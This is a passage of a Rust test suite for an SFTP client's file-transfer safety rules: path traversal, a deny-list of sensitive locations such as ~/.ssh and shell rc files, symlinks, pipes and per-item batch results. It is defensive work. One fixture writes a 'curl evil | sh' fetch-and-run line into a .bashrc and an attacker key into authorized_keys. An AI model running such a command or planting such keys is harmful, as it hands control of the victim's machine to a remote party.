        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("probe.txt");
        std::fs::write(&file, b"hi").unwrap();
        let md = std::fs::metadata(&file).unwrap();
        assert_eq!(local_owner_bits(&md), (None, None, None));
        std::fs::remove_dir_all(&dir).ok();
    }

    /// The conflict dialog decides per file, so one batch can mix actions. The
    /// backend used to read only the batch-wide `resume`, which flattened every
    /// per-file choice to the same value.
    #[test]
    fn item_resume_overrides_batch_value() {
        let with = |v: serde_json::Value| item_resume(&v, ResumeMode::Overwrite);
        assert_eq!(
            with(serde_json::json!({ "remote": "/a", "resume": "resume" })),
            ResumeMode::Resume
        );
        assert_eq!(
            with(serde_json::json!({ "remote": "/a", "resume": "skip" })),
            ResumeMode::Overwrite
        );
        // Absent, empty, and non-string all fall back to the batch value.
        assert_eq!(
            with(serde_json::json!({ "remote": "/a" })),
            ResumeMode::Overwrite
        );
        assert_eq!(
            with(serde_json::json!({ "remote": "/a", "resume": "" })),
            ResumeMode::Overwrite
        );
        assert_eq!(
            with(serde_json::json!({ "remote": "/a", "resume": 7 })),
            ResumeMode::Overwrite
        );
        // And a missing per-item value inherits the batch value.
        assert_eq!(
            item_resume(&serde_json::json!({ "remote": "/a" }), ResumeMode::Resume),
            ResumeMode::Resume
        );
    }

    /// A renderer-supplied rename must not escape the download destination.
    /// `safe_join_under` is the boundary `expand_download` applies to the
    /// `localName` it now accepts, so prove it rejects traversal rather than
    /// trusting the renderer to send a bare basename.
    #[test]
    fn download_rename_cannot_escape_destination() {
        let root = std::path::PathBuf::from("/tmp/sshspan-dest");
        assert!(safe_join_under(&root, &root, "../escape.txt").is_none());
        assert!(safe_join_under(&root, &root, "nested/../../escape.txt").is_none());
        assert!(safe_join_under(&root, &root, "plain.txt").is_some());
        assert!(safe_join_under(&root, &root, "renamed copy.txt").is_some());
    }

    /// Local mutations are gated on an unlocked vault and on the same
    /// app-data/system-directory rules the transfer paths use. This covers the
    /// pure path rules; `validate_local_mutation` additionally requires the
    /// vault password, which needs an AppHandle.
    #[test]
    fn local_mutation_rules_reject_protected_paths() {
        // A filesystem root is refused by the mutation guard before anything
        // else - the recursive delete would otherwise be aimed at the volume.
        assert!(std::path::Path::new("/").parent().is_none());
        // App data (the vault) and system directories stay off-limits.
        use directories::ProjectDirs;
        let app_data = ProjectDirs::from("org", "sshspan", "SSHSpan")
            .expect("project dirs")
            .data_dir()
            .join("sshspan.db");
        assert!(
            validate_sftp_local_path(&app_data.display().to_string(), LocalAccess::Write).is_err()
        );
        assert!(validate_sftp_local_path("/etc/passwd", LocalAccess::Write).is_err());
        assert!(validate_sftp_local_path("relative/path", LocalAccess::Write).is_err());
    }

    // ─── RU6a item 1: every derived local path, and local deletes (A6-02) ────

    /// The canonical form of a scratch directory (the fixtures compare
    /// resolved paths).
    #[cfg(unix)]
    fn canonical(dir: &LocalDir) -> PathBuf {
        std::fs::canonicalize(&dir.0).unwrap()
    }

    /// A local path built from remote names must be a plain chain of usable
    /// names below the destination: no `..`, no root, drive or share, no NUL,
    /// no Windows device name, nothing Windows would rename on disk.
    #[test]
    fn ru6a_derived_local_paths_refuse_names_that_are_not_plain() {
        let root = std::env::temp_dir().join(format!("sshspan-ru6a-root-{}", uuid::Uuid::new_v4()));
        let s = sensitive_fixture(std::path::Path::new("/fixture-not-here"));
        let refused = |path: PathBuf| derived_local_refusal(&root, &path, &s);
        for bad in [
            root.join("a").join("..").join("x"),
            root.join("CON"),
            root.join("sub").join("nul.txt"),
            root.join("a\u{0}b"),
            root.join("C:x"),
            root.join("trailing."),
            root.join("back:up"),
            std::env::temp_dir().join("elsewhere").join("x"),
        ] {
            assert!(
                refused(bad.clone()).is_some(),
                "must refuse {}",
                bad.display()
            );
        }
        for good in [
            root.join("ok.txt"),
            root.join("a").join("b c").join("é€.txt"),
        ] {
            assert_eq!(refused(good.clone()), None, "{}", good.display());
        }
    }

    /// A remote folder whose own files are called `.bashrc` and `.ssh/...`
    /// downloaded into a folder where those names ARE the shell rc file and
    /// `~/.ssh`: only the destination folder was checked, so they were
    /// written. Each derived path is re-checked; refused ones are skipped
    /// and reported, and no folder is created inside a denied location.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_folder_download_never_writes_into_a_denied_location() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/home/.bashrc", b"curl evil | sh");
        fx.write(
            "/srv/home/.ssh/authorized_keys",
            b"ssh-ed25519 AAAA attacker",
        );
        fx.write("/srv/home/notes.txt", b"fine");
        let local = LocalDir::new();
        let base = canonical(&local);
        let s = sensitive_fixture(&base);

        let expanded =
            expand_download_with(&sftp, "/srv/home", &base, &download_ctx(false), None, &s)
                .await
                .unwrap();

        let locals: Vec<PathBuf> = expanded
            .items
            .iter()
            .map(|i| PathBuf::from(&i.local_path))
            .collect();
        assert_eq!(locals, vec![base.join("home").join("notes.txt")]);
        assert!(
            !base.join("home").join(".ssh").exists(),
            "no folder may be created inside ~/.ssh"
        );
        let notes = expanded.notes.into_vec().join("\n");
        assert!(notes.contains("/srv/home/.bashrc"), "{notes}");
        assert!(notes.contains("/srv/home/.ssh"), "{notes}");
    }

    /// The single-file case: the remote name, or the rename the renderer
    /// sends for a conflict, must not land on a denied file either.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_single_file_download_onto_a_denied_file_is_skipped() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/.bashrc", b"x");
        fx.write("/srv/a.txt", b"x");
        let local = LocalDir::new();
        let base = canonical(&local);
        let home = base.join("home");
        std::fs::create_dir_all(&home).unwrap();
        let s = sensitive_fixture(&base);

        for (remote, rename) in [("/srv/.bashrc", None), ("/srv/a.txt", Some(".bashrc"))] {
            let expanded =
                expand_download_with(&sftp, remote, &home, &download_ctx(false), rename, &s)
                    .await
                    .unwrap();
            assert!(expanded.items.is_empty(), "{remote} {rename:?}");
            let notes = expanded.notes.into_vec().join("\n");
            assert!(notes.contains(remote), "{notes}");
        }
    }

    /// A queued download is written much later than it was checked (resumed
    /// after a reconnect, restored after a restart): the deny-list is checked
    /// again on its final path when the transfer starts.
    #[cfg(unix)]
    #[test]
    fn ru6a_a_queued_download_rechecks_the_deny_list_on_its_final_path() {
        let base = std::path::PathBuf::from("/fixture");
        let s = sensitive_fixture(&base);
        for denied in [
            base.join("home/.ssh/authorized_keys"),
            base.join("home/.bashrc"),
            base.join("cfg/ssh/config"),
        ] {
            assert!(
                local_write_refusal_with(&denied, &s).is_some(),
                "{}",
                denied.display()
            );
        }
        assert_eq!(
            local_write_refusal_with(&base.join("home/docs/a.txt"), &s),
            None
        );
    }

    /// The staged copy of an edited file is a fresh name DIRECTLY inside the
    /// staging folder, whatever the session id holds - and a staging folder
    /// that sits in a denied location is refused.
    #[cfg(unix)]
    #[test]
    fn ru6a_the_edit_staging_path_stays_a_plain_child_of_the_staging_folder() {
        let local = LocalDir::new();
        let temp = canonical(&local);
        let s = sensitive_fixture(std::path::Path::new("/fixture-not-here"));
        for session in [
            "3f2a1b9c-aaaa-bbbb",
            "../../evil",
            "a/b\\c..d",
            "\u{e9}\u{20ac}x\u{1f600}",
        ] {
            let p = edit_stage_path(&temp, session, "notes.txt", &s)
                .unwrap_or_else(|e| panic!("{session:?}: {e}"));
            assert_eq!(p.parent(), Some(temp.as_path()), "{session:?} -> {p:?}");
            assert!(crate::sftp::path_has_inert_extension(&p), "{p:?}");
            let name = p.file_name().unwrap().to_string_lossy().into_owned();
            assert!(
                !name.starts_with('.') && !name.contains(['/', '\\']),
                "{name:?}"
            );
        }
        let denied = sensitive_fixture(&temp);
        let inside_ssh = temp.join("home").join(".ssh");
        std::fs::create_dir_all(&inside_ssh).unwrap();
        assert!(edit_stage_path(&inside_ssh, "3f2a1b9c", "notes.txt", &denied).is_err());
    }

    /// Windows resolves `..` before it looks at the disk (and Linux's mkdir -p
    /// walks through it), so `<home>\x\..\.ssh` reached `~/.ssh` even though
    /// neither spelling matched the deny-list - when `~/.ssh` did not exist
    /// yet, the queue's `create_dir_all` made it.
    #[cfg(unix)]
    #[test]
    fn ru6a_local_paths_with_parent_segments_are_refused() {
        let base = std::path::PathBuf::from("/fixture");
        let s = sensitive_fixture(&base);
        for p in [
            "/fixture/home/x/../.ssh/config",
            "/fixture/home/docs/../../cfg/ssh/config",
            "/fixture/home/docs/..",
        ] {
            for access in [LocalAccess::Write, LocalAccess::Read] {
                assert!(
                    validate_sftp_local_path_with(p, access, &s).is_err(),
                    "{p} {access:?}"
                );
            }
        }
        assert!(
            validate_sftp_local_path_with("/fixture/home/docs/a.txt", LocalAccess::Write, &s)
                .is_ok()
        );
    }

    /// A target several levels below a symbolic link that points into
    /// `~/.ssh` resolves through the link even though the levels in between
    /// do not exist yet (they used to be judged literally).
    #[cfg(unix)]
    #[test]
    fn ru6a_a_link_into_a_denied_folder_is_followed_through_missing_levels() {
        let local = LocalDir::new();
        let base = canonical(&local);
        std::fs::create_dir_all(base.join("home/.ssh")).unwrap();
        std::fs::create_dir_all(base.join("dl")).unwrap();
        std::os::unix::fs::symlink(base.join("home/.ssh"), base.join("dl/link")).unwrap();
        let s = sensitive_fixture(&base);
        let target = base.join("dl/link/new/deeper/file.txt");
        assert!(validate_sftp_local_path_with(
            &target.display().to_string(),
            LocalAccess::Write,
            &s
        )
        .is_err());
        let fine = base.join("dl/new/deeper/file.txt");
        assert!(
            validate_sftp_local_path_with(&fine.display().to_string(), LocalAccess::Write, &s)
                .is_ok()
        );
    }

    /// Deleting the home folder deleted `~/.ssh`, the shell rc files and the
    /// vault with it: a folder that HOLDS a denied location is refused, by its
    /// own spelling and through links (a `~/.ssh` that is a link into a
    /// dotfiles checkout makes the checkout hold the keys). Checked through
    /// the validator the delete runs first - never by deleting anything real.
    #[cfg(unix)]
    #[test]
    fn ru6a_deleting_a_folder_that_holds_a_denied_location_is_refused() {
        let local = LocalDir::new();
        let base = canonical(&local);
        for dir in ["home/.ssh", "home/docs", "data", "dotfiles/ssh", "other"] {
            std::fs::create_dir_all(base.join(dir)).unwrap();
        }
        let s = sensitive_fixture(&base);
        let check = |p: PathBuf, s: &SensitiveLocations| {
            validate_local_delete_with(&p.display().to_string(), s)
        };
        for refused in [
            base.join("home"),
            base.clone(),
            base.join("home/.ssh"),
            base.join("data"),
        ] {
            assert!(check(refused.clone(), &s).is_err(), "{}", refused.display());
        }
        assert!(check(base.join("home/docs"), &s).is_ok());
        assert!(check(base.join("other"), &s).is_ok());

        // The locations are resolved when they are built (once per batch),
        // so the link exists first - as a dotfiles `~/.ssh` does.
        std::fs::create_dir_all(base.join("home2")).unwrap();
        std::os::unix::fs::symlink(base.join("dotfiles/ssh"), base.join("home2/.ssh")).unwrap();
        let linked = Locations {
            ssh_dir: Some(base.join("home2/.ssh")),
            ..fixture_locations(&base)
        }
        .resolve();
        assert!(check(base.join("dotfiles"), &linked).is_err());
    }

    /// The real home folder, through the real rules - validator only.
    #[test]
    fn ru6a_deleting_the_home_folder_is_refused() {
        let Some(home) = dirs::home_dir() else { return };
        assert!(
            validate_local_delete_with(&home.display().to_string(), &SensitiveLocations::current())
                .is_err(),
            "must refuse to delete {}",
            home.display()
        );
    }

    /// Moving the folder that holds `~/.ssh` away, writing into the moved
    /// copy (no longer on the deny-list) and moving it back got round every
    /// check - and so did moving a prepared folder into that place.
    #[cfg(unix)]
    #[test]
    fn ru6a_moving_a_folder_that_holds_a_denied_location_is_refused() {
        let local = LocalDir::new();
        let base = canonical(&local);
        for dir in ["home/.ssh", "home/docs/a", "prepared"] {
            std::fs::create_dir_all(base.join(dir)).unwrap();
        }
        let s = sensitive_fixture(&base);
        let rename = |from: PathBuf, to: PathBuf| {
            validate_local_rename_with(&from.display().to_string(), &to.display().to_string(), &s)
        };
        assert!(rename(base.join("home"), base.join("home-moved")).is_err());
        assert!(rename(base.join("prepared"), base.join("home")).is_err());
        assert!(rename(base.join("home/docs/a"), base.join("home/docs/b")).is_ok());
    }

    // ─── RU6a item 2: no type bits is not "a file" ───────────────────────────

    /// The folder the user PICKED was judged by its STAT alone: on a server
    /// that leaves the type bits out it was queued as one file - a read of a
    /// directory that can only fail.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_an_untyped_folder_picked_for_download_is_walked_not_read_as_a_file() {
        let (sftp, _fx) = untyped_tree().await;
        let local = LocalDir::new();
        let root = canonical(&local);

        let expanded = expand_download(&sftp, "/t", &root, &download_ctx(false), None)
            .await
            .unwrap();

        let mut remotes: Vec<&str> = expanded
            .items
            .iter()
            .map(|i| i.remote_path.as_str())
            .collect();
        remotes.sort();
        assert_eq!(remotes, vec!["/t/d/g", "/t/f"]);
        assert!(root.join("t").join("d").is_dir());
    }

    /// "Download as..." and the edit flow need a FILE: a folder is refused
    /// with a plain message (typed and untyped server alike) instead of a
    /// failed read, and a file on an untyped server still downloads.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_download_to_refuses_a_folder_with_a_plain_message() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/d/x", b"1");
        fx.write("/f.txt", b"hello");
        let local = LocalDir::new();
        for untyped in [false, true] {
            fx.knobs.lock().unwrap().untyped_modes = untyped;
            let err = download_to(&sftp, "/d", &local.file("d"))
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("is a folder"), "untyped={untyped}: {err}");
            assert!(!std::path::Path::new(&local.file("d")).exists());
        }
        download_to(&sftp, "/f.txt", &local.file("f.txt"))
            .await
            .expect("an untyped file still downloads");
        assert_eq!(std::fs::read(local.file("f.txt")).unwrap(), b"hello");
    }

    /// A pipe is not a file: opening one for reading blocks the server until
    /// a writer appears, which froze the whole SFTP session. Refused from its
    /// type, before anything opens it.
    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn ru6a_downloading_a_pipe_is_refused_before_it_is_opened() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.mkdir("/d");
        let fifo = fx.path("/d/pipe");
        assert!(std::process::Command::new("mkfifo")
            .arg(&fifo)
            .status()
            .unwrap()
            .success());
        let local = LocalDir::new();
        let outcome = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            download_to(&sftp, "/d/pipe", &local.file("pipe")),
        )
        .await;
        // Never leave the test server blocked in open(2) on the pipe.
        {
            use std::os::unix::fs::OpenOptionsExt;
            let _ = std::fs::OpenOptions::new()
                .write(true)
                .custom_flags(libc::O_NONBLOCK)
                .open(&fifo);
        }
        let err = outcome
            .expect("the download blocked on the pipe")
            .expect_err("a pipe is not a file")
            .to_string();
        assert!(err.contains("not a regular file"), "{err}");
    }

    /// The Send-to walk took every entry that was not a folder or a link for a
    /// file: a pipe was queued (its read blocks the source server), and a name
    /// the target needed sanitized was read from the SANITIZED name on the
    /// source - a file that does not exist there.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_send_to_skips_special_files_and_reads_each_entry_from_its_real_name() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/t/f", b"1");
        // (Not `a:b`: a letter and a colon read as a drive and are skipped.)
        fx.write("/t/back:up", b"2");
        fx.write("/t/d/g", b"3");
        fx.mkdir("/outside");
        fx.symlink("../outside", "/t/ln");
        assert!(std::process::Command::new("mkfifo")
            .arg(fx.path("/t/pipe"))
            .status()
            .unwrap()
            .success());
        let got = send_to_walk(&sftp, "/t").await;
        assert_eq!(
            got,
            vec![
                ("/t/back:up".to_string(), "/dest/t/back_up".to_string()),
                ("/t/d/g".to_string(), "/dest/t/d/g".to_string()),
                ("/t/f".to_string(), "/dest/t/f".to_string()),
            ]
        );
    }

    /// On a server without type bits the Send-to walk queued a folder as a
    /// file and a link as something to copy; entries are classified like the
    /// download walk does.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_send_to_walks_folders_of_a_server_without_file_types() {
        let (sftp, _fx) = untyped_tree().await;
        let got = send_to_walk(&sftp, "/t").await;
        assert_eq!(
            got,
            vec![
                ("/t/d/g".to_string(), "/dest/t/d/g".to_string()),
                ("/t/f".to_string(), "/dest/t/f".to_string()),
            ]
        );
        // ...and the picked root is recognised as a folder.
        assert_eq!(server_copy_root_is_dir(&sftp, "/t").await, Ok(true));
        assert_eq!(server_copy_root_is_dir(&sftp, "/t/f").await, Ok(false));
    }

    /// `expand_server_copy` from `root` to `/dest/<name>`: (source, target)
    /// pairs of the queued jobs, sorted.
    #[cfg(unix)]
    async fn send_to_walk(
        sftp: &russh_sftp::client::SftpSession,
        root: &str,
    ) -> Vec<(String, String)> {
        let queued: Arc<std::sync::Mutex<Vec<(String, String)>>> = Arc::default();
        let sink = queued.clone();
        let enqueue = move |batch: Vec<QueuedItem>| {
            sink.lock().unwrap().extend(batch.into_iter().map(|item| {
                let target = item.target.map(|t| t.remote_path).unwrap_or_default();
                (item.remote_path, target)
            }))
        };
        let name = root.rsplit('/').next().unwrap();
        expand_server_copy(
            &enqueue,
            sftp,
            root.to_string(),
            format!("/dest/{name}"),
            "src".into(),
            "Source".into(),
            "tgt".into(),
            "Target".into(),
            Arc::default(),
            Arc::default(),
        )
        .await
        .unwrap();
        let mut got = queued.lock().unwrap().clone();
        got.sort();
        got
    }

    /// A recursive delete on a server without type bits unlinked folders as
    /// files (refused) and failed; entries are classified - a link is still
    /// only unlinked, never followed.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_recursive_delete_works_on_a_server_without_file_types() {
        let (sftp, fx) = untyped_tree().await;
        remove_remote_tree(&sftp, "/t")
            .await
            .expect("the whole tree is deleted");
        assert!(!fx.exists("/t"));
        assert!(fx.exists("/outside"), "a link's target is never touched");
    }

    // ─── RU6a item 3 ─────────────────────────────────────────────────────────

    /// The staged download is fsynced before it is renamed over the
    /// destination, like the queue's download leg - otherwise a crash right
    /// after the rename can leave an empty or partial file under the final
    /// name. Durability itself cannot be observed from a test; the steps a
    /// real download goes through can (fix 1: this used to grep the source,
    /// which a comment could satisfy).
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_download_to_syncs_the_staged_file_before_the_rename() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/f.bin", &vec![3u8; 300_000]);
        let local = LocalDir::new();
        let dest = local.file("f.bin");

        download_to(&sftp, "/f.bin", &dest).await.expect("download");

        assert_eq!(download_steps(&dest), vec!["fsync", "rename"]);
        assert_eq!(std::fs::read(&dest).unwrap().len(), 300_000);
    }

    // ─── RU6a item 4: per-item results ───────────────────────────────────────

    #[cfg(unix)]
    fn batch() -> BatchCtx<'static> {
        BatchCtx {
            session_id: "sess",
            server_name: "srv",
            resume: ResumeMode::Overwrite,
            preserve_ts: false,
        }
    }

    /// One unreadable picked folder failed the WHOLE add (nothing queued)
    /// while the folders picked before it had already been created locally.
    /// Each item now has its own result, and the others are queued.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_one_unreadable_picked_folder_does_not_fail_the_others() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/a/1.txt", b"1");
        fx.write("/locked/x", b"x");
        fx.write("/b/2.txt", b"2");
        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
        let local = LocalDir::new();
        let dest = local.0.join("downloads");
        let items = vec![
            serde_json::json!({ "remote": "/a" }),
            serde_json::json!({ "remote": "/locked" }),
            serde_json::json!({ "remote": "/b" }),
        ];

        let out = expand_download_batch(
            &sftp,
            &items,
            &dest,
            &batch(),
            SensitiveLocations::current(),
        )
        .await
        .expect("one bad item must not fail the batch");

        let mut remotes: Vec<&str> = out.jobs.iter().map(|j| j.remote_path.as_str()).collect();
        remotes.sort();
        assert_eq!(remotes, vec!["/a/1.txt", "/b/2.txt"]);
        let statuses: Vec<(&str, ItemStatus, usize)> = out
            .outcomes
            .iter()
            .map(|o| (o.path.as_str(), o.status, o.added))
            .collect();
        assert_eq!(
            statuses,
            vec![
                ("/a", ItemStatus::Queued, 1),
                ("/locked", ItemStatus::Error, 0),
                ("/b", ItemStatus::Queued, 1),
            ]
        );
        let error = out.outcomes[1].error.clone().unwrap_or_default();
        assert!(
            error.contains("/locked") && error.contains("Permission denied"),
            "{error}"
        );
        assert!(!dest.join("locked").exists());
        assert!(dest.join("a").is_dir() && dest.join("b").is_dir());
    }

    /// Nothing is created locally for an item whose walk failed - not even the
    /// destination folder when no item could be walked at all - and the call
    /// then fails with the items' reasons.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_no_local_folder_is_created_for_items_whose_walk_failed() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/locked/x", b"x");
        fx.knobs.lock().unwrap().unlistable.push("/locked".into());
        let local = LocalDir::new();
        let dest = local.0.join("never-made");
        let items = vec![
            serde_json::json!({ "remote": "/locked" }),
            serde_json::json!({ "remote": "/missing" }),
        ];

        let out = expand_download_batch(
            &sftp,
            &items,
            &dest,
            &batch(),
            SensitiveLocations::current(),
        )
        .await
        .expect("item failures are results, not a failed call");

        assert!(out.jobs.is_empty());
        assert!(out.outcomes.iter().all(|o| o.status == ItemStatus::Error));
        assert!(!dest.exists(), "nothing could be downloaded: no folder");
        let failure = batch_failure(&out.outcomes).expect("nothing was queued");
        assert!(
            failure.contains("/locked") && failure.contains("/missing"),
            "{failure}"
        );
        assert_eq!(
            batch_failure(&[ItemOutcome::queued("/a", 0)]),
            None,
            "an empty folder is not a failure"
        );
    }

    /// One refused pick (a private key in `~/.ssh`) failed the whole
    /// multi-file upload and queued nothing. It is now that item's result,
    /// like an unreadable one, and the rest are queued.
    #[cfg(unix)]
    #[test]
    fn ru6a_a_refused_upload_pick_is_reported_and_the_rest_are_queued() {
        let local = LocalDir::new();
        let base = canonical(&local);
        std::fs::create_dir_all(base.join("home/.ssh")).unwrap();
        std::fs::create_dir_all(base.join("home/docs")).unwrap();
        std::fs::write(base.join("home/.ssh/config"), b"Host x").unwrap();
        std::fs::write(base.join("home/docs/a.txt"), b"a").unwrap();
        let s = sensitive_fixture(&base);
        let path = |rel: &str| base.join(rel).display().to_string();
        let items = vec![
            serde_json::json!({ "local": path("home/docs/a.txt"), "remote": "/up/a.txt" }),
            serde_json::json!({ "local": path("home/.ssh/config"), "remote": "/up/config" }),
            serde_json::json!({ "local": path("home/missing.txt"), "remote": "/up/m.txt" }),
        ];

        let out = expand_upload_batch(&items, &batch(), &s)
            .expect("one refused pick must not fail the batch");

        let sources: Vec<&str> = out.jobs.iter().map(|j| j.local_path.as_str()).collect();
        assert_eq!(sources, vec![path("home/docs/a.txt").as_str()]);
        let statuses: Vec<ItemStatus> = out.outcomes.iter().map(|o| o.status).collect();
        assert_eq!(
            statuses,
            vec![ItemStatus::Queued, ItemStatus::Error, ItemStatus::Error]
        );
        let refused = out.outcomes[1].error.clone().unwrap_or_default();
        assert!(
            refused.contains(&path("home/.ssh/config")) && refused.contains("cannot be uploaded"),
            "{refused}"
        );
        let missing = out.outcomes[2].error.clone().unwrap_or_default();
        assert!(missing.contains("missing.txt"), "{missing}");
    }

    // ─── RU6a item 7: Task 10's missing tests ────────────────────────────────

    /// `sftp_download`'s grant branch: a path the user picked in the save
    /// dialog may sit in a sensitive place (they chose it); the same path as a
    /// bare renderer string may not. App data and system directories stay
    /// refused either way.
    #[cfg(unix)]
    #[test]
    fn ru6a_a_dialog_granted_download_path_skips_only_the_deny_list() {
        let base = std::path::PathBuf::from("/fixture");
        let s = sensitive_fixture(&base);
        let ssh_config = base.join("home/.ssh/config").display().to_string();
        assert!(check_download_target(&ssh_config, true, &s).is_ok());
        assert!(check_download_target(&ssh_config, false, &s).is_err());
        let ordinary = base.join("home/docs/a.txt").display().to_string();
        assert!(check_download_target(&ordinary, false, &s).is_ok());
        for granted in [true, false] {
            assert!(check_download_target("relative/a.txt", granted, &s).is_err());
            #[cfg(unix)]
            assert!(check_download_target("/etc/passwd", granted, &s).is_err());
        }
    }

    /// Item 1: remote names with a NUL are refused, not flattened into a
    /// writable name; Windows' extra reserved device spellings are refused too.
    #[test]
    fn ru6a_remote_names_with_nul_or_windows_reserved_devices_are_refused() {
        for bad in [
            "a\u{0}b",
            "CONIN$",
            "conout$.txt",
            "COM\u{b9}.txt",
            "LPT\u{b2}",
        ] {
            assert_eq!(sanitize_remote_name(bad), None, "{bad:?}");
        }
    }

    /// Item 1: a local link outside the destination is refused BEFORE mkdir
    /// touches anything through it (checking only after mkdir was too late).
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_download_folders_cannot_create_through_a_link_outside_the_destination() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/r/link/new/f", b"x");
        let local = LocalDir::new();
        let outside = LocalDir::new();
        let root = canonical(&local);
        std::fs::create_dir_all(root.join("r")).unwrap();
        std::os::unix::fs::symlink(&outside.0, root.join("r/link")).unwrap();
        let expanded = expand_download(&sftp, "/r", &root, &download_ctx(false), None)
            .await
            .unwrap();
        assert!(expanded.items.is_empty());
        assert!(
            !outside.0.join("new").exists(),
            "mkdir ran outside the destination"
        );
    }

    /// Item 2: an unknown path is never opened on the assumption it is a file.
    /// On an untyped server a folder's OPENDIR can be refused too; the file
    /// open would read a folder, or worse a pipe.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_download_to_refuses_an_unknown_type_instead_of_opening_it() {
        let (sftp, fx) = untyped_tree().await;
        fx.knobs.lock().unwrap().unlistable.push("/t/d".into());
        let local = LocalDir::new();
        let err = download_to(&sftp, "/t/d", &local.file("unknown"))
            .await
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("Could not tell") && err.contains("not downloaded"),
            "{err}"
        );
        assert!(
            !fx.ops().iter().any(|op| op.starts_with("open ")),
            "{:?}",
            fx.ops()
        );
    }

    /// Item 4: a picked item whose final local path is refused is an ERROR,
    /// not a "queued: 0" success; an acceptable pick still queues.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_refused_download_target_has_its_own_error_result() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/a", b"a");
        fx.write("/b", b"b");
        let local = LocalDir::new();
        let base = canonical(&local);
        let dest = base.join("home");
        let items = vec![
            serde_json::json!({ "remote": "/a", "localName": ".bashrc" }),
            serde_json::json!({ "remote": "/b" }),
        ];
        let out = expand_download_batch(
            &sftp,
            &items,
            &dest,
            &batch(),
            Arc::new(sensitive_fixture(&base)),
        )
        .await
        .unwrap();
        assert_eq!(out.outcomes[0].status, ItemStatus::Error);
        assert_eq!(out.outcomes[1].status, ItemStatus::Queued);
        assert_eq!(out.jobs.len(), 1);
    }

    /// Item 12: a modification time change alone is a conflict too (the other
    /// save can have exactly the same length).
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_remote_mtime_change_without_a_size_change_is_a_conflict() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"my edit").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        std::fs::File::options()
            .write(true)
            .open(fx.path("/srv/app.conf"))
            .unwrap()
            .set_modified(std::time::UNIX_EPOCH + std::time::Duration::from_secs(1_600_000_000))
            .unwrap();
        sync.clone().on_change().await;
        assert_eq!(tmp_opens(&fx), 0);
        let e = events.lock().unwrap()[0].clone();
        assert_eq!(e["conflict"], true);
        assert_eq!(e["remoteSize"], 2);
        assert_eq!(e["remoteModifiedMs"], 1_600_000_000_000i64);
    }

    // ─── RU6a item 10 ────────────────────────────────────────────────────────

    /// An entry whose type the server leaves out and whose LSTAT then fails
    /// is left alone (RU4) - and the note now says why, instead of hiding the
    /// cause behind "does not say whether it is a file or a folder".
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_an_entry_whose_type_could_not_be_checked_says_why() {
        let (sftp, fx) = untyped_tree().await;
        fx.knobs
            .lock()
            .unwrap()
            .lstat_refused
            .push("/t/d".to_string());
        let sftp_ref: &russh_sftp::client::SftpSession = &sftp;

        let plan = plan_download("/t", "t", |dir| async move {
            list_remote_dir(sftp_ref, &dir).await
        })
        .await
        .unwrap();
        let notes = plan.notes.into_vec().join("\n");
        assert!(
            notes.contains("/t/d") && notes.contains("Permission denied"),
            "{notes}"
        );

        let out = chmod_path(&sftp, "/t", 0o700, true, true, true)
            .await
            .unwrap();
        assert!(
            out["failed"].to_string().contains("Permission denied"),
            "{out}"
        );
    }

    // ─── RU6a fix round 1, group B: the local-path policy ────────────────────

    /// A download plan made up locally: the picked folder `pick`, `folders`
    /// folders in it and `files` files spread over all of them.
    #[cfg(unix)]
    fn synthetic_plan(pick: &str, folders: usize, files: usize) -> DownloadPlan {
        let mut plan = DownloadPlan::default();
        plan.dirs.push(PlannedDir {
            remote: format!("/{pick}"),
            rel: vec![pick.to_string()],
        });
        for d in 0..folders {
            plan.dirs.push(PlannedDir {
                remote: format!("/{pick}/d{d}"),
                rel: vec![pick.to_string(), format!("d{d}")],
            });
        }
        for f in 0..files {
            let mut rel = plan.dirs[f % plan.dirs.len()].rel.clone();
            rel.push(format!("f{f}.txt"));
            plan.files.push(PlannedFile {
                remote: format!("/{}", rel.join("/")),
                rel,
                size: 1,
            });
        }
        plan
    }

    /// Item 2: the deny-list check of a folder download resolved every
    /// protected location again for every FILE (about 50 resolutions per
    /// file: 4 s for 10,000 files on Linux, about 90 s on Windows, before
    /// anything was queued). The locations are resolved once now, and a file
    /// is judged by its folder's resolved path and its own name.
    #[cfg(unix)]
    #[test]
    fn ru6a_fix1_a_folder_download_resolves_paths_per_folder_not_per_file() {
        let local = LocalDir::new();
        let root = canonical(&local);
        let s = sensitive_fixture(&root);
        let plan = synthetic_plan("pick", 9, 9_990);

        reset_resolutions();
